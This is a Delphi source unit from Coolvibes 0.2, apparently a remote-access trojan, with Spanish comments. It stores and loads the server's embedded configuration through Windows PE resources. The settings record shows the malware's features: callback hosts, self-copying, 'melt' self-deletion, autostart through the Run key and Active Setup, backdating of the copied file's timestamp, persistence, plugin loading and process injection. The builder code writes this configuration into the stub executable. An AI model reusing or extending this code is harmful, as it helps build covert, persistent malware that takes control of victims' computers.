{Unit usada Coolvibes 0.2 para leer y escribir la configuración del archivo
Pertenece tanto al cliente como al server, estando en la carpeta del server SettingsDef.pas}
unit SettingsDef;

{Basada en:
      * Source: Editserver using Resources example
      * Date:   17th October '06
      * Author: tt (theef3000[at]yahoo[dot]com)
    (If you use this source, don't forget to credit the author!)}

interface

uses
  Windows;

type
  {* All data we want to read/write is stored in this record *}
  TSettings = record
    sHosts, sID, sFileNameToCopy, sCopyTo, sRunRegKeyName, snumerocifrado,snumerocifrado2,sPluginName,sInyectadorFile{No forma parte de la configuración, se usa para saber la localización del inyector},sActiveSetupKeyName: string[255];
    //Cadena de 255 caracteres
    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior, bCerrar, bCerrarMonitor, bArranqueActiveSetup, bPersistencia: boolean;
    InyectorHandle : Thandle;
  end;
  PSettings = ^TSettings;
  PConfigCompartida   =^TSettings;
const
  RC_SETTINGS = 'CFG';

function WriteSettings(Filename: PChar; Settings: PSettings;conectador:string): boolean;
function ReadSettings(var Settings: PSettings): boolean;

implementation

// Escribe la configuración en el archivo especificado
function WriteSettings(Filename: PChar; Settings: PSettings;conectador:string): boolean;
var
  hResource: THandle;
begin
  Result    := False;
  hResource := BeginUpdateResource(Filename, false);
  if hResource <> 0 then
  begin
    if(length(conectador) >0) then
      UpdateResource(hResource, 'DLL', 'R', 0, pointer(conectador),length(conectador));
    if UpdateResource(hResource, RT_RCDATA, RC_SETTINGS, 0, Settings,
      SizeOf(Settings^)) then
      Result := True;
    EndUpdateResource(hResource, False);  //Hay que cerrar el recurso de todos modos
  end;
end;

// Lee la configuración de si mismo
function ReadSettings(var Settings: PSettings): boolean;
var
  hResInfo: HRSRC;
  hRes:     HGLOBAL;
begin
  Result   := False;
  hResInfo := FindResource(hInstance, RC_SETTINGS, RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      Settings := LockResource(hRes);
      Result   := True;
    end;
  end;
end;

end.
